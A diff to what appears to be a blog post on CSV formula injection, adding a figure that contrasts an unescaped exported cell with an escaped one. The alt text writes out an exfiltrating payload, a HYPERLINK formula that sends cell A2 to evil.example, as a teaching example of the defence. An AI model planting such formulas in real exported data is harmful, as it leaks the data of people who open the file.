@@ -23,6 +23,12 @@ The exports come from a lead-research tool I built: company names, descriptions 
 
 Older write-ups also describe formulas that start programs through DDE in old versions of Excel. Whatever your users' Excel does with those, the data-leak and data-corruption cases above apply to every spreadsheet program.
 
+## What does the user actually see?
+
+![The same scraped cell opened in a spreadsheet. Exported as is, cell B2 shows a Click link, and clicking it sends A2 and more to evil.example; the CSV value is =HYPERLINK("http://evil.example?x="&A2,"Click"). Escaped with a quote prefix and quoting, B2 shows the formula as plain text and nothing runs or is sent. Numbers are left alone: -42 stays a number a SUM can add. Excel can drop the quote prefix if the file is saved and reopened.](/figures/csv-sheet.webp)
+
+_Left: what an unescaped export looks like to the person who opens it. Right: the same cell after escaping._
+
 ## The fixed escaper
 
 ```js title="csv.mjs"
